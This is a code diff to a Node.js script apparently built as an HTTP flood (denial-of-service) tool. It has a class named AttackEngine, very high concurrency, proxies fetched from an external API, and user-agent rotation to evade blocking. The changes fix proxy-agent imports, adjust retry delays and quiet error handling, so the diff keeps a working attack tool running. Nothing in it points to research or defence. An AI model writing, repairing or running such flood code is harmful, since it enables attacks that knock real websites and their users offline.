@@ -4,8 +4,8 @@ const os = require('os');
 const http = require('http');
 const https = require('https');
 const process = require('process');
-const HttpsProxyAgent = require('https-proxy-agent');
-const HttpProxyAgent = require('http-proxy-agent');
+const { HttpsProxyAgent } = require('https-proxy-agent');
+const { HttpProxyAgent } = require('http-proxy-agent');
 
 const MAX_CONCURRENT = Math.min(os.cpus().length * 154, 1540);
 const REQUEST_TIMEOUT = 8000;
@@ -27,10 +27,10 @@ const USER_AGENTS = loadLines('ua.txt');
 const UA_POOL = Array.from({ length: 10000 }, () =>
     USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0');
 
-async function getProxiesFromAPI(retries = 3) {
+async function getProxiesFromAPI(retries = 2) {
     for (let i = 0; i < retries; i++) {
         try {
-            const res = await axios.get('https://optrpms2.onrender.com/v2/', { timeout: 5000 }); // 5s timeout
+            const res = await axios.get('https://optrpms2.onrender.com/v2/', { timeout: 5000 });
             if (res.data && Array.isArray(res.data.proxies) && res.data.proxies.length > 0) {
                 console.log(`Loaded ${res.data.proxies.length} proxies from API.`);
                 return res.data.proxies;
@@ -40,7 +40,7 @@ async function getProxiesFromAPI(retries = 3) {
         } catch (err) {
             console.warn(`Proxy API fetch failed (try ${i + 1}): ${err.message}`);
         }
-        await new Promise(r => setTimeout(r, 5000)); // 5s between each try
+        await new Promise(r => setTimeout(r, 50000)); // wait 50s before retrying
     }
     return null;
 }
@@ -134,8 +134,8 @@ class AttackEngine {
         if (proxy) {
             const proxyUrl = `http://${proxy.host}:${proxy.port}`;
             const agent = isHttps ? new HttpsProxyAgent(proxyUrl) : new HttpProxyAgent(proxyUrl);
-            options.httpsAgent = isHttps ? agent : undefined;
-            options.httpAgent = !isHttps ? agent : undefined;
+            if (isHttps) options.httpsAgent = agent;
+            else options.httpAgent = agent;
         } else {
             options.httpsAgent = new https.Agent({ keepAlive: true });
             options.httpAgent = new http.Agent({ keepAlive: true });
@@ -147,8 +147,8 @@ class AttackEngine {
                 this.stats.success++;
                 return;
             }
-        } catch {
-            // ignored
+        } catch (err) {
+            // silence
         }
 
         this.stats.errors++;
